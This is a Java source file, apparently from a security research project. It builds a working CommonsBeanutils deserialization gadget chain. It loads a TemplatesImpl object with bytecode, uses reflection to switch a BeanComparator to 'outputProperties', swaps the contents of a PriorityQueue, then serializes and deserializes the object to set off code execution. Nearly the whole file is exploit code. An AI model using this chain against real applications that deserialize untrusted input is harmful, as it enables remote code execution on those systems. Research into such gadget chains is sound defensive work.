package com.anbai.sec.serializes;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.io.FileUtils;

import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.math.BigInteger;
import java.util.Arrays;
import java.util.PriorityQueue;
import java.util.Properties;

import static com.anbai.sec.classloader.XalanTemplatesImpl.CLASS_BYTES;

public class BeanUtilsTest {

	public static TemplatesImpl createTemplatesImpl() throws Exception {
		// 获取TemplatesImpl构造方法
		Constructor<TemplatesImpl> constructor = TemplatesImpl.class.getDeclaredConstructor(
				byte[][].class, String.class, Properties.class, int.class, TransformerFactoryImpl.class
		);

		// 修改访问权限
		constructor.setAccessible(true);

		// 创建TemplatesImpl实例
		return constructor.newInstance(
				new byte[][]{CLASS_BYTES}, "", new Properties(), -1, new TransformerFactoryImpl()
		);
	}

	public static void main(String[] args) throws Exception {
		TemplatesImpl templates = createTemplatesImpl();

		// mock method name until armed
		BeanComparator comparator = new BeanComparator("lowestSetBit");

		// create queue with numbers and basic comparator
		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);

		// stub data for replacement later
		queue.add(new BigInteger("1"));
		queue.add(new BigInteger("1"));

		// switch method called by comparator
		Field propertyField = comparator.getClass().getDeclaredField("property");
		propertyField.setAccessible(true);
		propertyField.set(comparator, "outputProperties");

		// switch contents of queue
		Field queueField = queue.getClass().getDeclaredField("queue");
		queueField.setAccessible(true);
		Object[] queueArray = (Object[]) queueField.get(queue);
		queueArray[0] = templates;
		queueArray[1] = templates;

		ByteArrayOutputStream baos = new ByteArrayOutputStream();
		ObjectOutputStream    out  = new ObjectOutputStream(baos);
		out.writeObject(queue);
		out.flush();
		out.close();

		byte[] bytes = baos.toByteArray();

		System.out.println(Arrays.toString(bytes));

		ObjectInputStream in = new ObjectInputStream(new ByteArrayInputStream(bytes));
		in.readObject();
		in.close();
	}

}
